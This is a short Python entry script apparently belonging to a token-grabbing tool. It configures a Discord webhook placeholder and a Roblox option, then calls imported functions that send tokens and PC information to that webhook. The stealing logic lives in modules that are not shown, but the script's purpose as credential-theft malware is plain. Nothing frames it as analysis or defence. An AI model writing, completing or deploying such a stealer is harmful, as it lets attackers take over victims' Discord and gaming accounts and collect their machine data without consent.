
__CONFIG__ = {
    "webhook": "Your Webhook",
    "roblox": True, 
}

from component.x3 import Made_By_Omar
from component.info import PcInfo




if __name__ == "__main__":
    discord = Made_By_Omar()
    discord.send_tokens(__CONFIG__["webhook"])
    pc_info = PcInfo(__CONFIG__["webhook"])







